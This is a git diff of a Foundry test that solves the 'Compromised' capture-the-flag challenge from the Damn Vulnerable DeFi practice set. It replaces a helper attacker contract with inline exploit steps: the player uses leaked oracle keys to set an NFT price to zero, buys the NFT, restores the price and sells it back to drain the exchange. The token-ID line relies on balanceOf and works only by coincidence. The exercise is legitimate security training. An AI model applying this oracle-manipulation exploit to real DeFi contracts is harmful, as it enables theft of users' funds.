@@ -9,37 +9,7 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
-import {ERC721Holder} from "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";
-import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";
 import {Base64} from "solady/utils/Base64.sol";
-
-contract TestOwnNFT is ERC721Holder, Ownable {
-    address private immutable i_token;
-    address private immutable i_exchange;
-
-    constructor(address token, address payable exchange) Ownable(msg.sender) {
-        i_token = token;
-        i_exchange = exchange;
-    }
-
-    function getNFT() private {
-        Exchange(payable(i_exchange)).buyOne{value: address(this).balance}();
-    }
-
-    function sellNFT() external onlyOwner {
-        uint256 tokenId = DamnValuableNFT(i_token).nonce() - 1;
-        DamnValuableNFT(i_token).approve(i_exchange, tokenId);
-        Exchange(payable(i_exchange)).sellOne(tokenId);
-    }
-
-    receive() external payable {
-        if (msg.sender == owner()) {
-            getNFT();
-        } else {
-            payable(owner()).transfer(address(this).balance);
-        }
-    }
-}
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -122,16 +92,10 @@ contract CompromisedChallenge is Test {
         vm.broadcast(sourceKey_2); //Trusted source 2
         TrustfulOracle(oracle).postPrice("DVNFT", 0);
 
-        //player deploys a contract that will buy the NFT and sell it back to the exchange
         vm.startPrank(player);
-        TestOwnNFT ownNFT = new TestOwnNFT(address(nft), payable(exchange));
-        //player sends the contract some ETH to buy the NFT
-        (bool success,) = address(ownNFT).call{value: PLAYER_INITIAL_ETH_BALANCE}("");
-        (success);
+        exchange.buyOne{value: address(player).balance}();
         vm.stopPrank();
-        //check that the contract has the NFT
-        assertEq(nft.balanceOf(address(ownNFT)), 1);
-
+       
         //Oracle changes the price of the NFT back to the initial price
         vm.broadcast(sourceKey_1); //Trusted source 1
         TrustfulOracle(oracle).postPrice("DVNFT", INITIAL_NFT_PRICE);
@@ -139,7 +103,9 @@ contract CompromisedChallenge is Test {
         TrustfulOracle(oracle).postPrice("DVNFT", INITIAL_NFT_PRICE);
 
         vm.startPrank(player);
-        ownNFT.sellNFT();
+        uint256 tokenId = nft.balanceOf(player) - 1;
+        nft.approve(address(exchange), tokenId);
+        exchange.sellOne(tokenId);
         //player will transfer the required ETH to the recovery address
         (bool sent,) = recovery.call{value: EXCHANGE_INITIAL_ETH_BALANCE}("");
         (sent);
